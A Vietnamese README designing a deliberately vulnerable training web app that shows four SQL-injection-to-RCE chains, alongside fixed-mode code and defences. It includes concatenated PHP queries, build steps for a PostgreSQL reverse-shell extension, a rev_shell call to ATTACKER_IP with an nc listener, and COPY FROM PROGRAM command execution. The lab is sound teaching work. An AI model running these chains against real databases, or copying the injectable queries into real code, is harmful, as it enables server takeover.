# RealWorld SQLi to RCE Lab

> Mục tiêu của README này là mô tả cách xây dựng một **ứng dụng web có bối cảnh thực tế** để trình diễn các chuỗi từ SQL Injection đến Remote Code Execution. Ứng dụng không chia thành 4 trang lab rời rạc như `/sqlite-attach`, `/postgres-copy`, `/postgres-extension`, `/admin-rce`. Thay vào đó, toàn bộ hướng khai thác được đặt trong **một website thật có luồng nghiệp vụ bình thường**.

---

## 1. Ý tưởng tổng thể

Website được thiết kế như một nền tảng nội dung/thương mại điện tử nội bộ có tên:

```text
BlueMarket CMS
```

Ứng dụng có các chức năng giống một website thật:

- Trang chủ hiển thị sản phẩm, bài viết, người bán.
- Tìm kiếm sản phẩm/người dùng.
- Đăng ký, đăng nhập, quên mật khẩu.
- Trang hồ sơ người dùng.
- Trang quản trị nội dung dành cho admin.
- Chức năng upload media/theme/template.
- Chức năng sinh báo cáo hệ thống cho admin.
- Cơ chế cache/analytics nội bộ sử dụng SQLite.
- Database chính sử dụng PostgreSQL.

Các hướng SQLi to RCE không được trình bày như 4 bài lab riêng, mà được ẩn trong các chức năng bình thường của website.

---

## 2. Bốn hướng được nhúng vào một website

| Hướng | Nằm trong chức năng thật của website | Bản chất |
|---|---|---|
| Hướng 1 | Product search / analytics cache | SQLite `ATTACH DATABASE` để ghi file, sau đó file được web server thực thi |
| Hướng 2 | User profile / report backend | PostgreSQL Large Object + C extension để tạo reverse shell |
| Hướng 3 | Admin system report | PostgreSQL `COPY FROM PROGRAM` để chạy command hệ điều hành |
| Hướng 4 | Admin takeover + content management | SQLi chiếm quyền admin, sau đó upload/sửa template để RCE |

Điểm quan trọng: người dùng nhìn thấy **một website duy nhất**. Các hướng chỉ là các **attack chain khác nhau** phát sinh từ những chức năng có vẻ hợp lệ.

---

## 3. Kiến trúc hệ thống

```text
blue-market-lab/
├── docker-compose.yml
├── nginx/
│   └── default.conf
├── app/
│   ├── public/
│   │   ├── index.php
│   │   ├── uploads/
│   │   └── assets/
│   ├── src/
│   │   ├── Controllers/
│   │   │   ├── HomeController.php
│   │   │   ├── SearchController.php
│   │   │   ├── AuthController.php
│   │   │   ├── ProfileController.php
│   │   │   ├── AdminController.php
│   │   │   └── ReportController.php
│   │   ├── Services/
│   │   │   ├── PostgresService.php
│   │   │   ├── SqliteCacheService.php
│   │   │   ├── TemplateService.php
│   │   │   └── UploadService.php
│   │   ├── Views/
│   │   └── config.php
│   ├── storage/
│   │   ├── cache/
│   │   ├── sqlite/
│   │   │   └── catalog_cache.db
│   │   └── templates/
│   └── composer.json
├── postgres/
│   ├── init.sql
│   └── extensions/
│       └── pg_rev_shell.c
└── docs/
    ├── threat-model.md
    ├── vulnerable-code.md
    ├── fixed-code.md
    └── demo-flow.md
```

Ứng dụng chính là một web PHP chạy sau Nginx. PostgreSQL được dùng cho dữ liệu chính như users, products, posts, sessions. SQLite được dùng như một local cache/analytics database để lưu thống kê tìm kiếm sản phẩm.

Lý do chọn cấu trúc này:

- PHP giúp demo file write to webshell dễ hơn với SQLite `ATTACH DATABASE`.
- PostgreSQL vẫn giữ được hai hướng giống phần PDF: `COPY FROM PROGRAM` và PostgreSQL C extension.
- Một website có thể dùng nhiều storage backend trong thực tế: database chính, cache cục bộ, analytics file, queue hoặc report database.

---

## 4. Luồng nghiệp vụ của website

### 4.1. Người dùng bình thường

```text
Trang chủ
→ tìm kiếm sản phẩm
→ xem sản phẩm
→ xem người bán
→ đăng ký / đăng nhập
→ cập nhật hồ sơ
→ xem lịch sử đơn hàng
```

### 4.2. Quản trị viên

```text
Đăng nhập admin
→ quản lý sản phẩm
→ quản lý bài viết
→ upload media
→ chỉnh template email / landing page
→ xuất báo cáo hệ thống
```

### 4.3. Vị trí các lỗ hổng trong website

| Chức năng | File xử lý | Loại lỗi |
|---|---|---|
| Tìm kiếm sản phẩm | `SearchController.php` | SQLi trên SQLite cache |
| Tìm kiếm người dùng | `SearchController.php` | SQLi trên PostgreSQL |
| Xem profile người bán | `ProfileController.php` | second-order SQLi |
| Xuất báo cáo hệ thống | `ReportController.php` | PostgreSQL command execution nếu DB user có quyền cao |
| Quản lý template/media | `AdminController.php` | upload/template abuse sau khi chiếm admin |

---

## 5. Hướng 1: SQLite `ATTACH DATABASE` trong product search

### 5.1. Bối cảnh thực tế

Website có chức năng tìm kiếm sản phẩm:

```text
/search?q=laptop
```

Để tăng tốc, hệ thống lưu từ khóa tìm kiếm vào SQLite cache:

```text
storage/sqlite/catalog_cache.db
```

Ví dụ bảng cache:

```sql
CREATE TABLE search_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    keyword TEXT,
    created_at TEXT
);
```

Trong phiên bản có lỗi, app ghi log tìm kiếm bằng cách nối chuỗi SQL:

```php
$sql = "INSERT INTO search_logs(keyword, created_at) VALUES ('" . $q . "', datetime('now'))";
$sqlite->exec($sql);
```

Nếu `q` không được kiểm soát, attacker có thể chèn thêm câu SQL.

---

### 5.2. Ý tưởng khai thác

SQLite `ATTACH DATABASE` cho phép gắn thêm một database file vào connection hiện tại. Nếu app chạy với quyền ghi vào thư mục webroot hoặc thư mục được web server thực thi, attacker có thể lợi dụng primitive này để tạo file mới.

Chuỗi khai thác:

```text
SQLi trong product search
→ chèn stacked query
→ ATTACH DATABASE tới đường dẫn trong webroot
→ CREATE TABLE / INSERT dữ liệu có nội dung PHP
→ truy cập file đó qua browser
→ web server thực thi PHP
→ RCE
```

---

### 5.3. Điều kiện để thành RCE

Hướng này chỉ thành RCE khi thỏa các điều kiện:

```text
1. Ứng dụng dùng SQLite.
2. SQLi cho phép thực thi thêm câu SQL.
3. Process web có quyền ghi vào thư mục đích.
4. Attacker biết hoặc đoán được đường dẫn webroot.
5. File ghi ra được web server xử lý như mã thực thi.
6. Nội dung ghi ra đủ để tạo webshell hoặc đoạn code server-side.
```

Nếu chỉ ghi được file nhưng file không được server thực thi, tác động chỉ dừng ở **file write**, chưa phải RCE.

---

### 5.4. Vai trò trong website

Không tạo route riêng kiểu `/sqlite-attach`. Hướng này được đặt trong chức năng thật:

```text
Product Search + Search Analytics Cache
```

Người dùng bình thường vẫn nghĩ đây chỉ là tính năng tìm kiếm sản phẩm. Phần nguy hiểm nằm ở cách backend ghi log vào SQLite.

---

## 6. Hướng 2: PostgreSQL Large Object + Extension trong profile/report backend

### 6.1. Bối cảnh thực tế

Website có PostgreSQL làm database chính. Các bảng chính:

```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username TEXT,
    email TEXT,
    password_hash TEXT,
    role TEXT,
    description TEXT
);

CREATE TABLE products (
    id SERIAL PRIMARY KEY,
    name TEXT,
    description TEXT,
    owner_id INT REFERENCES users(id)
);

CREATE TABLE posts (
    id SERIAL PRIMARY KEY,
    author_id INT REFERENCES users(id),
    content TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

Ứng dụng có chức năng xem profile người bán:

```text
/profile/12
```

Trong phiên bản có lỗi, profile hoặc report backend có một truy vấn dùng dữ liệu lấy từ database rồi nối lại vào câu SQL khác. Đây là mô hình phù hợp để mô phỏng second-order SQLi.

Ví dụ:

```php
$user = $pg->query("SELECT id, username, email FROM users WHERE id = " . $id)->fetch();

$sql = "SELECT * FROM posts WHERE author_email = '" . $user['email'] . "' ORDER BY created_at DESC";
$posts = $pg->query($sql)->fetchAll();
```

Ở đây `email` có thể đã được attacker kiểm soát từ trước, sau đó được app dùng lại trong truy vấn khác.

---

### 6.2. Ý tưởng giống phần PostgreSQL Extension trong PDF

Phần PDF mô tả hướng tạo PostgreSQL C extension để có reverse shell. Ý tưởng chính:

```text
SQLi
→ upload shared library `.so`
→ PostgreSQL load function từ `.so`
→ gọi function
→ reverse shell với quyền user postgres
```

Trong lab này, việc upload `.so` được mô phỏng bằng PostgreSQL Large Object:

```text
SQLi
→ lo_create()
→ ghi từng phần nội dung file .so vào pg_largeobject
→ lo_export() ghi .so ra filesystem
→ CREATE FUNCTION rev_shell(text, integer)
→ SELECT rev_shell(LHOST, LPORT)
→ RCE
```

---

### 6.3. File extension mẫu

Trong thư mục `postgres/extensions/` đặt file:

```text
pg_rev_shell.c
```

Mục đích của file này là tạo một hàm PostgreSQL native có thể mở kết nối ngược về máy listener, chuyển stdin/stdout/stderr vào socket, rồi gọi shell.

Trong README không cần dùng hướng này làm demo chính vì nó phức tạp. Nên dùng nó làm case study kỹ thuật sâu hoặc demo phụ.

---

### 6.4. Biên dịch extension trong môi trường lab

Trong container PostgreSQL hoặc VM build:

```bash
sudo apt install postgresql-server-dev-13 gcc

gcc -I$(pg_config --includedir-server) \
    -shared -fPIC \
    -o pg_rev_shell.so \
    pg_rev_shell.c
```

Lưu ý version PostgreSQL phải khớp với header/dev package. Nếu PostgreSQL là version khác, cần dùng `postgresql-server-dev-<version>` tương ứng.

---

### 6.5. Nạp và gọi function trong PostgreSQL

Sau khi file `.so` đã tồn tại trên server, tạo function:

```sql
CREATE FUNCTION rev_shell(text, integer)
RETURNS integer
AS '/tmp/pg_rev_shell', 'rev_shell'
LANGUAGE C STRICT;
```

Sau đó gọi function:

```sql
SELECT rev_shell('ATTACKER_IP', 443);
```

Máy attacker mở listener trước:

```bash
nc -nvlp 443
```

Nếu thành công, shell nhận được sẽ chạy với quyền của process PostgreSQL, thường là user `postgres`.

---

### 6.6. Điều kiện để thành RCE

```text
1. SQLi đủ mạnh để thực thi các câu SQL cần thiết.
2. Có thể tạo hoặc cập nhật Large Object.
3. Có quyền export Large Object ra filesystem.
4. Có quyền CREATE FUNCTION.
5. PostgreSQL cho phép load C function.
6. File `.so` được compile đúng version PostgreSQL.
7. Network/container/firewall không chặn reverse shell.
```

---

### 6.7. Vai trò trong website

Không tạo route riêng kiểu `/postgres-extension`. Hướng này được gắn với luồng thật:

```text
Profile / Seller Activity Report / Internal Reporting Backend
```

Tức là attacker bắt đầu từ một lỗi SQLi trong chức năng profile hoặc báo cáo, sau đó nâng tác động bằng PostgreSQL primitive.

---

## 7. Hướng 3: PostgreSQL `COPY FROM PROGRAM` trong admin system report

### 7.1. Bối cảnh thực tế

Website có trang admin dùng để xuất báo cáo hệ thống:

```text
/admin/reports/system
```

Chức năng này cho phép admin xem thống kê:

- Tổng số user.
- Tổng số sản phẩm.
- Số lượng đơn hàng.
- Trạng thái worker.
- Hostname của server.

Trong phiên bản có lỗi, tham số filter/report name được nối trực tiếp vào SQL:

```php
$type = $_GET['type'];
$sql = "SELECT * FROM report_templates WHERE type = '" . $type . "'";
$result = $pg->query($sql);
```

Nếu SQLi cho phép stacked query, attacker có thể chèn thêm các câu SQL dùng `COPY FROM PROGRAM`.

---

### 7.2. Ý tưởng giống Method 1: COPY trong PDF

Phần PDF mô tả `COPY FROM PROGRAM` như một cách để PostgreSQL chạy shell command, lưu output vào table rồi đọc lại.

Chuỗi khai thác:

```text
SQLi trong report filter
→ stacked query
→ CREATE TABLE chứa output
→ COPY table FROM PROGRAM '<command>'
→ SELECT output từ table
→ RCE
```

Ví dụ trong môi trường lab an toàn:

```sql
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(line TEXT);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
```

Có thể dùng các lệnh an toàn để demo:

```text
id
whoami
hostname
pwd
```

Không cần reverse shell vẫn chứng minh được command execution.

---

### 7.3. Điều kiện để thành RCE

```text
1. SQLi cho phép thực thi stacked query.
2. PostgreSQL cho phép dùng COPY FROM PROGRAM.
3. Database user là superuser hoặc có role pg_execute_server_program.
4. Lệnh hệ điều hành được PostgreSQL process thực thi.
5. Output có thể được ghi vào table và đọc lại qua SQL.
```

Đây là hướng demo rất gọn vì không cần upload file, không cần compile extension, không cần webshell.

---

### 7.4. Vai trò trong website

Không tạo route riêng kiểu `/postgres-copy`. Hướng này được đặt trong chức năng thật:

```text
Admin System Report
```

Lý do hợp lý về mặt nghiệp vụ: các hệ thống quản trị thường có chức năng report, export, health check hoặc job monitoring. Nếu tham số report bị nối chuỗi SQL và DB user có quyền quá cao, lỗi SQLi có thể bị nâng thành OS command execution.

---

## 8. Hướng 4: SQLi → Admin takeover → Upload/Template → RCE

### 8.1. Bối cảnh thực tế

Website có trang quản trị nội dung:

```text
/admin
```

Admin có thể:

- Upload ảnh sản phẩm.
- Upload file media.
- Chỉnh template email.
- Chỉnh landing page.
- Cài theme/plugin nội bộ.

SQLi ban đầu không trực tiếp chạy command. Thay vào đó, SQLi được dùng để chiếm quyền admin.

---

### 8.2. Chuỗi khai thác

```text
SQLi trong login/search/forgot password
→ đọc bảng users hoặc sửa role/password
→ đăng nhập admin
→ dùng chức năng upload/template/plugin
→ server thực thi nội dung attacker kiểm soát
→ RCE
```

Ví dụ:

```text
1. SQLi đọc được hash admin.
2. Crack hash hoặc reset password admin.
3. Đăng nhập `/admin`.
4. Upload một file PHP trá hình hoặc sửa template server-side.
5. Gọi file/template đó qua browser.
6. Chạy `whoami` để chứng minh RCE.
```

---

### 8.3. Khác biệt so với ba hướng còn lại

Ba hướng đầu là:

```text
SQLi → DBMS primitive → RCE
```

Hướng 4 là:

```text
SQLi → chiếm quyền ứng dụng → app feature → RCE
```

Tức là RCE không đến trực tiếp từ database, mà đến từ chức năng nguy hiểm ở tầng ứng dụng sau khi attacker có quyền admin.

---

### 8.4. Điều kiện để thành RCE

```text
1. SQLi cho phép đọc/sửa dữ liệu xác thực hoặc phân quyền.
2. Có tài khoản admin hoặc role admin trong database.
3. App có chức năng upload, sửa template, cài plugin hoặc import module.
4. Chức năng đó thiếu kiểm tra file type, extension, nội dung hoặc sandbox.
5. Nội dung attacker upload/sửa được server thực thi.
```

---

## 9. Thiết kế giao diện web theo kiểu thực tế

Ứng dụng không hiển thị nút "Exploit hướng 1", "Exploit hướng 2". Thay vào đó, giao diện nên giống website thật.

### 9.1. Menu người dùng

```text
Home
Products
Search
Sellers
Login
Register
Profile
```

### 9.2. Menu admin

```text
Dashboard
Products
Users
Media Library
Templates
Reports
Settings
```

### 9.3. Các vị trí demo ẩn trong luồng thật

| Demo | Người trình bày thao tác ở đâu? | Người xem thấy gì? |
|---|---|---|
| SQLite `ATTACH DATABASE` | Ô tìm kiếm sản phẩm | Tìm kiếm lỗi hoặc tạo file bất thường trong webroot |
| PostgreSQL Extension | Profile/report backend | Sau khi trigger, listener nhận shell `postgres` |
| PostgreSQL `COPY FROM PROGRAM` | Admin report filter | Output `id/whoami/hostname` hiện trong bảng report |
| Admin takeover | Login/admin media/template | Từ user thường thành admin rồi upload/sửa template |

---

## 10. Chế độ vulnerable và fixed

Nên có biến môi trường để bật/tắt phiên bản lỗi:

```env
APP_MODE=vulnerable
```

hoặc:

```env
APP_MODE=fixed
```

### 10.1. Vulnerable mode

Trong chế độ này:

- Có truy vấn nối chuỗi SQL.
- DB user PostgreSQL có quyền cao cho demo `COPY FROM PROGRAM`.
- SQLite cache có quyền ghi vào thư mục mô phỏng webroot.
- Admin upload/template cố ý kiểm tra yếu.

### 10.2. Fixed mode

Trong chế độ sửa lỗi:

- Thay nối chuỗi bằng prepared statement.
- Tách quyền DB user theo nguyên tắc least privilege.
- Không cấp `pg_execute_server_program` cho user của web app.
- Không cho DB user quyền tạo C function hoặc export file tùy ý.
- SQLite cache nằm ngoài webroot.
- Webroot không writable.
- Upload chỉ cho phép file media hợp lệ.
- Template không được render từ input không tin cậy.

---

## 11. Gợi ý cấu hình Docker

### 11.1. Services

```yaml
services:
  web:
    build: ./app
    ports:
      - "8080:80"
    volumes:
      - ./app:/var/www/html
    depends_on:
      - postgres

  postgres:
    image: postgres:13
    environment:
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: postgres
      POSTGRES_DB: bluemarket
    volumes:
      - ./postgres/init.sql:/docker-entrypoint-initdb.d/init.sql
      - ./postgres/extensions:/extensions
```

### 11.2. PostgreSQL roles cho lab

Nên tạo nhiều role để dễ giải thích tác động của privilege:

```sql
-- User bình thường, dùng ở fixed mode
CREATE ROLE app_user LOGIN PASSWORD 'app_user_password';

-- User cố ý có quyền cao để demo COPY FROM PROGRAM
CREATE ROLE report_user LOGIN PASSWORD 'report_user_password';
GRANT pg_execute_server_program TO report_user;

-- User dùng để demo extension trong lab
CREATE ROLE extension_user LOGIN PASSWORD 'extension_user_password';
```

Trong demo thực tế, có thể dùng superuser để giảm lỗi cấu hình, nhưng trong báo cáo phải giải thích đây là cấu hình nguy hiểm và không nên dùng cho production.

---

## 12. Demo flow đề xuất

### 12.1. Demo chính nên chọn

Nên chọn PostgreSQL `COPY FROM PROGRAM` làm demo chính vì:

- Chuỗi ngắn.
- Dễ quan sát.
- Không cần compile `.so`.
- Không cần upload webshell.
- Bám sát SQLi to RCE trực tiếp.

Demo:

```text
1. Đăng nhập admin hoặc dùng endpoint report bị SQLi.
2. Chèn payload stacked query.
3. Tạo bảng `cmd_output`.
4. Dùng `COPY cmd_output FROM PROGRAM 'id'`.
5. Đọc output từ bảng.
6. Kết luận: SQLi đã dẫn đến command execution.
```

---

### 12.2. Demo dễ chạy nhất

Nếu nhóm cần demo chắc chắn chạy trên lớp, chọn hướng 4:

```text
SQLi → admin takeover → upload/template → RCE
```

Demo này dễ vì không phụ thuộc quyền PostgreSQL đặc biệt. Tuy nhiên phải nói rõ đây là SQLi dẫn tới RCE gián tiếp ở tầng ứng dụng.

---

### 12.3. Demo phân tích kỹ thuật sâu

Hướng PostgreSQL Large Object + Extension nên để làm phần phân tích hoặc demo video đã quay trước, vì dễ lỗi do:

- Sai version PostgreSQL.
- Thiếu `postgresql-server-dev`.
- Compile `.so` lỗi.
- Sai đường dẫn `.so`.
- Thiếu quyền `CREATE FUNCTION`.
- Reverse shell bị firewall/container chặn.

---

## 13. Phân tích source code gây lỗi

### 13.1. Mẫu lỗi chung

```php
$sql = "SELECT * FROM users WHERE username = '" . $_GET['u'] . "'";
$result = $pg->query($sql);
```

Vấn đề:

```text
Input người dùng được nối trực tiếp vào câu SQL.
Database không phân biệt được đâu là dữ liệu, đâu là cú pháp SQL.
Attacker có thể thay đổi cấu trúc truy vấn.
```

---

### 13.2. Sửa bằng prepared statement

```php
$stmt = $pg->prepare("SELECT * FROM users WHERE username = $1");
$result = $pg->execute($stmt, [$_GET['u']]);
```

Hoặc với PDO:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute([
    ':username' => $_GET['u']
]);
```

---

## 14. Điều kiện chung dẫn tới RCE trong lab

Một SQLi chỉ trở thành RCE khi có thêm điều kiện:

```text
1. SQLi đủ mạnh để attacker điều khiển luồng SQL.
2. Truy vấn có thể chạm tới execution primitive.
3. Primitive đó có thể ghi file, load code, chạy command hoặc thay đổi quyền.
4. DB user hoặc app process có quyền đủ cao.
5. File/code/lệnh được runtime thực sự thực thi.
6. Sandbox, permission, container, firewall không chặn chuỗi khai thác.
```

Mapping với 4 hướng:

| Hướng | Execution primitive |
|---|---|
| SQLite `ATTACH DATABASE` | File write vào nơi web server thực thi |
| PostgreSQL Large Object + Extension | Load native shared library |
| PostgreSQL `COPY FROM PROGRAM` | OS command execution từ DBMS |
| Admin takeover | Upload/template/plugin execution ở app layer |

---

## 15. Phòng chống

### 15.1. Chống SQL Injection

- Dùng prepared statement / parameterized query.
- Không nối chuỗi SQL từ input người dùng.
- Validate input theo allowlist.
- Không dựa vào blacklist ký tự như `'`, khoảng trắng hoặc `--`.
- Log lỗi an toàn, không trả stacktrace cho client.

### 15.2. Giảm khả năng SQLi thành RCE

- Không dùng DB superuser cho web application.
- Không cấp `pg_execute_server_program` nếu không cần.
- Không cấp quyền tạo C function/extension cho app user.
- Không cho DB user ghi vào webroot.
- Đặt SQLite database ngoài webroot.
- Webroot nên read-only với process app nếu có thể.
- Tắt thực thi script trong thư mục upload.
- Kiểm tra MIME type, extension và nội dung file upload.
- Không cho admin sửa template server-side trực tiếp nếu không sandbox.
- Chạy app trong container với user quyền thấp.

---

## 16. Đề xuất cách chia demo cho nhóm

| Người | Nội dung | Vai trò |
|---|---|---|
| Người 1 | Giới thiệu website BlueMarket CMS, kiến trúc, luồng dữ liệu | Cho thấy đây là web real-world, không phải 4 trang lab rời |
| Người 2 | Hướng SQLite `ATTACH DATABASE` và PostgreSQL `COPY FROM PROGRAM` | File write và DBMS command execution |
| Người 3 | Hướng PostgreSQL Large Object + Extension | Phân tích case study kỹ thuật từ PDF |
| Người 4 | Hướng admin takeover + phòng chống + fixed mode | RCE tầng ứng dụng và tổng kết biện pháp khắc phục |

Nếu chỉ có thời gian demo trực tiếp một hướng, nên demo:

```text
PostgreSQL COPY FROM PROGRAM
```

hoặc:

```text
SQLi → admin takeover → upload/template → RCE
```

Các hướng còn lại có thể trình bày bằng sơ đồ, source code và video ngắn.

---

## 17. Kết luận

Thiết kế này biến bốn hướng SQLi to RCE thành các attack chain nằm trong một website có bối cảnh thực tế:

```text
BlueMarket CMS
├── Product search dùng SQLite cache
├── PostgreSQL lưu users/products/posts
├── Profile/report backend có truy vấn lỗi
├── Admin report có nguy cơ COPY FROM PROGRAM
└── Admin content management có upload/template nguy hiểm
```

Cách này giúp báo cáo tự nhiên hơn vì người xem thấy một ứng dụng thật, có chức năng thật, có dữ liệu thật. Các hướng RCE không còn bị tách thành bốn trang rời rạc, mà trở thành bốn kịch bản tấn công khác nhau trên cùng một hệ thống.
